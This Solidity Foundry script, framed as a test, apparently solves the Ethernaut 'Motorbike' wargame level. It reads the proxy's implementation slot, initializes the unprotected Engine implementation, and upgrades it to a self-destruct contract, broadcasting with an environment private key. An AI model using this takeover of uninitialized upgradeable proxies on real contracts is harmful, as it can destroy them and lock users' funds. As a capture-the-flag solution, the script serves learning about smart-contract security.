// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

import "forge-std/Test.sol";
import "../src/MotorBike.sol";
import "../src/SelfDestructor.sol";

contract MotorBikeTest is Test {
    address motorBikeAddress = 0x1E15774bAc3CbCd7f9EDfDA65a6A8cd52cFc73EE;
    bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function test() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        SelfDestructor selfDestructor = new SelfDestructor();
        MotorBike motorBike = MotorBike(motorBikeAddress);
        address engineAddress = vm.load(motorBikeAddress, bytes32(uint256(_IMPLEMENTATION_SLOT)));
        Engine engine = Engine(engineAddress);
        engine.initialize();
        engine.upgradeToAndCall(address(selfDestructor), abi.encodeWithSignature("destroy(address)", EOA));
        vm.stopBroadcast();
    }
}
